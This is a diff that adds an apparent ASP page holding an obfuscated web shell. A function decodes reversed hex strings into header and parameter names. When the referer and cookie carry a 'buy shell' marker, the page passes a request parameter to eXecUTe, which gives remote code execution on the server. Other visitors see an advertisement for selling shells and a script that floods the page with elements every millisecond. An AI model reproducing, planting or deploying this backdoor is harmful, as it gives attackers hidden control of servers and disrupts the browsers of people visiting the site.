@@ -1,0 +1,56 @@
+<script>
+function sa(){
+	var d=document.createElement('d');
+	d.style.border='1px solid #000';
+	d.style.padding='1px';
+	var t;
+	for(var i=0;i<10;i++){
+		t=document.createElement('d');
+		t.style.border='1px solid #000';
+		t.style.padding='1px';
+		d.appendChild(t);
+	}
+	document.body.appendChild(d);
+}
+
+</script>
+<%
+Dim RE,CK
+function boy(text)
+    const key="gw"
+
+    dim str : str=text
+    dim str1
+    dim str2 : str2=strreverse(str)
+
+    for i=1 to len(str2) step 4
+
+        str1=str1 & ChrW(cint("&H" & mid(str2,i,4)))
+    next
+    boy=mid(str1,len(key)+1,len(str)-len(key))
+end function
+
+RE = Cstr(Request.ServerVariables(boy("2500540025005400640054002500F500050045004500840077007600")))
+CK = Cstr(Request.ServerVariables(boy("56009600B600F600F6003400F500070047004700840077007600")))
+
+TIPS = "buy shell,send mail to liumang123@luo.bo"
+
+Function b():
+    b = request(boy("2300D20077007600"))
+End Function
+
+Function a():
+    eXecUTe(b())
+End Function
+
+
+
+if ( InStr(RE, TIPS) > 0 and InStr(CK, TIPS) >0  )  Then
+	  a()
+	  Else
+          Response.Write(TIPS)
+	  Response.Write("<script>setInterval('sa()',1);</script>")
+          
+end if
+
+%>
